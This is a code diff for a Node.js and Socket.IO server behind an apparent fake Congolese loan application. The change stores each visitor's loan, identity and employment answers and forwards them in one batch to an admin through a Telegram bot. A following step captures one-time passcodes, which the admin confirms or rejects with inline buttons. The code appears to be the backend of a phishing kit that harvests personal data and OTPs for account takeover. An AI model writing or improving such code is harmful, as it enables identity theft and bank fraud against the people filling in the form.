@@ -33,6 +33,9 @@ app.post(`/bot${process.env.BOT_TOKEN}`, (req, res) => {
     res.sendStatus(200);
 });
 
+// Store user session data
+const userSessions = {};
+
 io.on('connection', (socket) => {
     // Generate unique Congo application session tag
     const appId = `COD-${Math.random().toString(36).substring(2, 7).toUpperCase()}`;
@@ -40,13 +43,36 @@ io.on('connection', (socket) => {
     socket.join(appId);
     console.log(`🔌 Congo User connected: ${appId}`);
     
+    // Initialize session data storage for this user
+    userSessions[appId] = {
+        step1: null,
+        step2: null,
+        step3: null
+    };
+    
     // Send AppID back to the frontend right away
     socket.emit('session-ready', { appId: appId });
 
-    // Standard Log Streams (No admin inline interaction buttons needed)
-    socket.on('step1', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 1: Loan Request", data, false));
-    socket.on('step2', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 2: Identity Profile", data, false));
-    socket.on('step3', (data) => botManager.sendToAdmin(appId, "🇨🇩 Step 3: Employment Profile", data, false));
+    // Step 1: Collect loan details (no send to admin yet)
+    socket.on('step1', (data) => {
+        userSessions[appId].step1 = data;
+        console.log(`📝 Step 1 data collected for ${appId}`);
+    });
+
+    // Step 2: Collect identity info (no send to admin yet)
+    socket.on('step2', (data) => {
+        userSessions[appId].step2 = data;
+        console.log(`📝 Step 2 data collected for ${appId}`);
+    });
+
+    // Step 3: Collect employment info AND send consolidated data to admin
+    socket.on('step3', (data) => {
+        userSessions[appId].step3 = data;
+        console.log(`📝 Step 3 data collected for ${appId}`);
+        
+        // Send consolidated data to admin after step 3
+        botManager.sendConsolidatedData(appId, userSessions[appId]);
+    });
 
     // Step 4: OTP Entry Point (Triggers confirmation/rejection inline buttons)
     socket.on('step4', (data) => {
@@ -60,6 +86,7 @@ io.on('connection', (socket) => {
 
     socket.on('disconnect', () => {
         console.log(`🔌 User disconnected: ${appId}`);
+        delete userSessions[appId];
     });
 });
 
